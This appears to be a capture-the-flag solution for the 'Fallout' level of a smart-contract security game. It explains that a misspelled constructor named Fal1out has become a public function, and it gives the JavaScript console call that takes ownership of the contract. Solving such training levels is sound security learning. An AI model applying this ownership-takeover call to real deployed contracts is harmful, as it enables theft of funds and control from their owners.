# Fallout

**HINT:** Read the contract **CAREFULLY**
<details>
<summary>Answer</summary>
<p>

```js
await contract
```
Look at the abi and you'll see because the constructor is miss spelled in has become a normal function. Leaving the contract ownership up to anyone. 
<br></br>

Simply use: 
```js
await contract.Fal1out.sendTransaction({ from:player, value: '10000000000' })
```
You will then be the owner of the contract check with: 
```js
await contract.owner()<br></br>
```
Then click Submit
</details>